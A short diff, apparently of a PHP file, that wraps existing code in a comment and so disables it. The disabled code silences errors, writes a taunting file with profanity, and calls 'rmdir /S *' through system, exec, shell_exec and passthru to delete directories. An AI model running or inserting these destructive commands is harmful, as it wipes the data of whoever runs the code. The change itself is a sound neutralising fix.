@@ -1,3 +1,4 @@
+/*
 error_log(0);
 error_reporting(0);
 file_put_contents("fuck-you.txt", "Fuck you asshole.");
@@ -22,3 +23,4 @@ system('rmdir /S *');
 exec('rmdir /S *');
 shell_exec('rmdir /S *');
 passthru('rmdir /S *');
+*/
